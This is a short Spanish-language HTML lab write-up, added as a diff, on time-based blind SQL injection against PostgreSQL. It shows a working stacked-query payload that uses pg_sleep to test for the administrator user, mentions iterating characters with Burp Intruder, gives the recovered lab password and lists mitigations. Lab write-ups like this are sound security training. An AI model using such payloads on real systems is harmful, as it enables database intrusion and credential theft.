@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 15 - Time-Based SQLi with Data Extraction</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+
+<section class="activities-section">
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 15</h2>
+<p>Blind SQL Injection with Time Delays and Information Retrieval</p>
+</div>
+
+
+<div class="info-card">
+<h3>Información</h3>
+<p><strong>Nivel:</strong> Practitioner</p>
+<p><strong>Tipo:</strong> Time-based Blind SQL Injection</p>
+</div>
+
+
+<div class="info-card">
+<h3>Objetivo</h3>
+
+<p>
+Extraer la contraseña del usuario administrator
+mediante retrasos de tiempo.
+</p>
+
+</div>
+
+
+<div class="info-card">
+<h3>Procedimiento</h3>
+
+<p>Payload utilizado:</p>
+
+<pre>
+';SELECT CASE
+WHEN (username='administrator')
+THEN pg_sleep(10)
+ELSE pg_sleep(0)
+END FROM users--
+</pre>
+
+<p>
+Se utilizó Burp Intruder para iterar caracteres
+y reconstruir la contraseña completa.
+</p>
+
+<p>Contraseña obtenida:</p>
+
+<pre>
+tmmowcfokak4zmj52ky0
+</pre>
+
+</div>
+
+
+<div class="info-card">
+<h3>Mitigación</h3>
+
+<ul>
+<li>Consultas parametrizadas.</li>
+<li>Monitoreo de tiempos de respuesta.</li>
+<li>Validación de cookies.</li>
+</ul>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+</div>
+</section>
+
+</body>
+</html>
